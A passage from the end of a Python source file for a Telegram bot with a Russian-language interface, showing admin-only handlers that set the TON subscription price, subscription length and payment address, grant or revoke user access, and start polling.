    address = await get_setting("ton_address", DEFAULT_TON_ADDRESS)
    await message.answer(f"<b>🔧 Админ-панель</b>\n\nЦена: <b>{price} TON</b>\nСрок: <b>{days} дн.</b>\nTON-адрес: <code>{address or 'не задан'}</code>", reply_markup=admin_keyboard())

@dp.callback_query(F.data == "admin_back")
async def admin_back(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID: return
    await callback.message.edit_text("<b>🔧 Админ-панель</b>\n\nВыберите действие:", reply_markup=admin_keyboard())

@dp.callback_query(F.data == "admin_settings")
async def admin_settings(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID: return
    price = await get_setting("subscription_price_ton", str(DEFAULT_SUBSCRIPTION_PRICE))
    days = await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS))
    address = await get_setting("ton_address", DEFAULT_TON_ADDRESS)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"Цена: {price} TON", callback_data="admin_set_price")],
        [InlineKeyboardButton(text=f"Срок: {days} дн.", callback_data="admin_set_days")],
        [InlineKeyboardButton(text="TON-адрес", style="primary", callback_data="admin_set_address")],
        [InlineKeyboardButton(text="Назад", style="primary", callback_data="admin_back")],
    ])
    await callback.message.edit_text(f"<b>⚙️ Настройки</b>\n\nЦена: <b>{price} TON</b>\nСрок: <b>{days} дн.</b>\nАдрес: <code>{address or 'не задан'}</code>", reply_markup=keyboard)

@dp.callback_query(F.data.in_({"admin_set_price", "admin_set_days", "admin_set_address", "admin_free_add", "admin_revoke"}))
async def admin_setting_prompt(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID: return
    mapping = {
        "admin_set_price": ("price", "Отправь новую цену в TON (например: 1.5)"),
        "admin_set_days": ("days", "Отправь срок подписки в днях (например: 30)"),
        "admin_set_address": ("address", "Отправь новый TON-адрес для приёма оплаты."),
        "admin_free_add": ("free_add", "Отправь Telegram ID пользователя."),
        "admin_revoke": ("revoke", "Отправь Telegram ID для удаления доступа.")
    }
    state, prompt = mapping[callback.data]
    ADMIN_STATES[callback.from_user.id] = state
    await callback.message.edit_text(f"<b>Изменение настройки</b>\n\n{prompt}\n\n/cancel — отмена")
    await callback.answer()

@dp.message(F.text == "/cancel")
async def admin_cancel(message: Message):
    if message.from_user.id == ADMIN_ID:
        ADMIN_STATES.pop(message.from_user.id, None)
        await message.answer("Отменено. /admin — открыть панель.")

@dp.message(F.from_user.id == ADMIN_ID)
async def admin_state_input(message: Message):
    state = ADMIN_STATES.get(message.from_user.id)
    if not state or not message.text: return
    value = message.text.strip()
    try:
        if state == "price":
            price = Decimal(value.replace(",", "."))
            if price <= 0: raise ValueError
            await set_setting("subscription_price_ton", format_ton(price))
            await message.answer(f"✅ Цена изменена: <b>{format_ton(price)} TON</b>")
        elif state == "days":
            days = int(value)
            if days <= 0 or days > 3650: raise ValueError
            await set_setting("subscription_days", days)
            await message.answer(f"✅ Срок изменён: <b>{days} дн.</b>")
        elif state == "address":
            if len(value) < 20 or " " in value: raise ValueError
            await set_setting("ton_address", value)
            await message.answer("✅ TON-адрес сохранён.")
        elif state == "free_add":
            user_id = int(value)
            await add_free_access(user_id)
            await message.answer(f"✅ Бесплатный доступ выдан ID <code>{user_id}</code>.")
        elif state == "revoke":
            user_id = int(value)
            await revoke_user_access(user_id)
            await message.answer(f"✅ Доступ забран у ID <code>{user_id}</code>.")
        else: return
        ADMIN_STATES.pop(message.from_user.id, None)
    except (ValueError, InvalidOperation):
        await message.answer("❌ Неверное значение. Попробуй ещё раз или /cancel.")

async def main():
    bot_info = await bot.get_me()
    logger.info("BOT STARTED | @%s", bot_info.username)
    await init_db()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot, allowed_updates=["message", "business_message", "callback_query", "pre_checkout_query"])

if __name__ == "__main__":
    asyncio.run(main())
